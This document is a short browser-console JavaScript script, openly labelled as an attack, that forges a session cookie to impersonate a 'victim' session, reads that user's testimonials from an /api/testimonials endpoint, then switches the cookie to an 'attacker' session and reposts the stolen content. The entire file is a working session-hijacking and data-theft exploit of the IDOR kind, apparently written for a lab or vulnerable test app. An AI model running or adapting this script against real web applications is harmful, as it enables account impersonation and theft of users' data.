(async function transferTestimonials() {
    
    console.log("%c=== VICTIM DATA (Session 1369) ===", "color: red; font-weight: bold");

    // Force session=1369
    document.cookie = "session=1369; path=/";
    await new Promise(r => setTimeout(r, 500));

    // ==================== GET Victim's Testimonials (1369) ====================
    let victimData = [];
    
    try {
        const res = await fetch('/api/testimonials', {
            method: 'GET',
            credentials: 'include'
        });

        if (res.ok) {
            victimData = await res.json();
        }
    } catch (e) {
        console.error("Fetch failed", e);
    }

    // Print Victim Data Clearly
    console.log("🔴 Victim Key → session=1369");
    console.log("🔴 Victim Value(s):");
    console.log(victimData);

    if (Array.isArray(victimData) && victimData.length > 0) {
        console.table(victimData);
    }

    // Combine all victim data
    let combinedContent = victimData.map(item => {
        if (typeof item === 'string') return item;
        if (item && item.content) return item.content;
        return JSON.stringify(item);
    }).join(" || ");

    console.log("%c=== ATTACKER POSTING BELOW (Session 1333) ===", "color: lime; font-weight: bold");
    console.log("Attacker will post this content:", combinedContent);

    // ==================== POST to Attacker Session 1333 ====================
    document.cookie = "session=1333; path=/";
    await new Promise(r => setTimeout(r, 600));

    await fetch('/api/testimonials', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'Accept': '*/*'
        },
        credentials: 'include',
        body: JSON.stringify({ 
            content: combinedContent 
        })
    })
    .then(r => {
        console.log("POST Status to 1333:", r.status);
        return r.text();
    })
    .then(text => console.log("POST Response:", text))
    .catch(err => console.error("POST Error:", err));

    console.log("%c=== TRANSFER COMPLETED ===", "color: cyan; font-weight: bold");

})();
